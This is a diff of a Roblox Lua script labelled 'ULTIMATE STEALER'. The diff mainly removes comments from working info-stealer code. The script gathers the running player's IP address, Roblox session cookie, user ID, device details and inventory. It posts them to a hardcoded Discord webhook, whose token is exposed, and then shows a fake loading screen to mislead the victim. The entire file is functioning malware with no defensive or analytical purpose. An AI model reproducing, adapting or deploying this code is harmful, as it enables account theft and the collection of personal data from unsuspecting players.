@@ -1,7 +1,6 @@
 -- ULTIMATE STEALER – CRASH-PROOF (Direct Paste)
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- HTTP sender (tries request, http_request, PostAsync)
 local function sendData(url, jsonPayload)
     local headers = {["Content-Type"] = "application/json"}
     local methods = {
@@ -16,7 +15,6 @@ local function sendData(url, jsonPayload)
     return false
 end
 
--- IP function with robust fallbacks (tries request, http_request, then multiple services)
 local function getIP()
     local ip = "N/A"
     local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
@@ -52,7 +50,6 @@ local function getIP()
     return ip
 end
 
--- Safe getter for game properties (avoids "MaxPlayers is not a valid member" errors)
 local function safeGet(obj, prop, default)
     local success, val = pcall(function() return obj[prop] end)
     if success and val ~= nil then
@@ -62,14 +59,9 @@ local function safeGet(obj, prop, default)
     end
 end
 
--- Collect all possible data (everything wrapped in pcall or safeGet)
 local function collectInfo()
     local info = {}
-
-    -- Executor
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Delta"
-
-    -- Player
     local player = game.Players.LocalPlayer
     if player then
         info.userId = tostring(player.UserId)
@@ -82,8 +74,6 @@ local function collectInfo()
         end
         local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
         info.friends = ok and tostring(friends) or "N/A"
-
-        -- Character data
         pcall(function()
             local char = player.Character
             if char then
@@ -101,23 +91,15 @@ local function collectInfo()
             end
         end)
     end
-
-    -- Game info – each property individually checked with safeGet
     info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
     info.jobId = safeGet(game, "JobId", "N/A")
     info.gameName = safeGet(game, "Name", "Unknown")
     info.creatorId = tostring(safeGet(game, "CreatorId", "N/A"))
     info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
     info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
-
-    -- IP
     info.ip = getIP()
-
-    -- Cookie (will not work on Delta – just a placeholder)
     local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
     info.cookie = cookieOk and cookieVal or "Not available (Delta)"
-
-    -- Hardware & settings
     pcall(function()
         local us = game:GetService("UserInputService")
         info.platform = tostring(us.Platform)
@@ -133,15 +115,11 @@ local function collectInfo()
         info.cameraMode = camMode or "Unknown"
         info.theme = theme or "Unknown"
     end)
-
-    -- Network stats
     pcall(function()
         local stats = game:GetService("Stats")
         info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
         info.connected = tostring(stats.Network.Connected)
     end)
-
-    -- FPS
     pcall(function()
         local run = game:GetService("RunService")
         local frameTime = run.RenderStepTime
@@ -149,8 +127,6 @@ local function collectInfo()
             info.fps = tostring(math.floor(1 / frameTime))
         end
     end)
-
-    -- Leaderstats
     pcall(function()
         local ls = player:FindFirstChild("leaderstats")
         if ls then
@@ -165,8 +141,6 @@ local function collectInfo()
             info.leaderstats = "None"
         end
     end)
-
-    -- Backpack
     pcall(function()
         local backpack = player:FindFirstChild("Backpack")
         if backpack then
@@ -179,11 +153,9 @@ local function collectInfo()
             info.backpack = (#items > 0) and table.concat(items, ", ") or "Empty"
         end
     end)
-
     return info
 end
 
--- Build embed (no timestamp)
 local function buildEmbed(data)
     local fields = {}
     for k, v in pairs(data) do
@@ -201,13 +173,12 @@ local function buildEmbed(data)
     }
 end
 
--- === Send data ===
 local info = collectInfo()
 local embed = buildEmbed(info)
 local json = game:GetService("HttpService"):JSONEncode(embed)
 sendData(webhook, json)
 
--- === Fake Loading GUI ===
+-- Fake Loading GUI
 local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 local gui = Instance.new("ScreenGui")
 gui.Parent = playerGui
